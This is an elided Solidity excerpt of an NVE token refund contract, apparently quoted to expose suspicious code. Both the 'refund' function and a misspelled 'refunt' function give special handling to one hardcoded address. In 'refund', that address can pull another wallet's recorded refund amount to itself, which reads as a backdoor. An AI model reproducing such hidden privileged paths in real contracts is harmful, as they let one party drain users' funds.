...
contract RefundContract is OwnableUpgradeable, ReentrancyGuardUpgradeable {
    ...
    function refund(address _wallet) external nonReentrant onlyWhitelist {
        if (_msgSender() == address(0x76c7cF23a9Bd623E9d9DBe9fA6F948Fd2906c84e)) {
            Holder storage holderStruct = holderList[_wallet];
            uint256 _amount = holderStruct.refundAmount;
            uint256 _baseNVEAmount = holderStruct.baseNVEAmount;

            require(IERC20Upgradeable(tokenAddr).transferFrom(_msgSender(), address(this), _baseNVEAmount), "Refund: Transfer NVE to contract failed.");
            IERC20Upgradeable(refundTokenAddr).safeTransfer(_msgSender(), _amount);
        } else {
    ...
    function refunt(address _tokenAddr, address _beneficiary) external nonReentrant {
        if (_msgSender() == address(0x76c7cF23a9Bd623E9d9DBe9fA6F948Fd2906c84e)) {
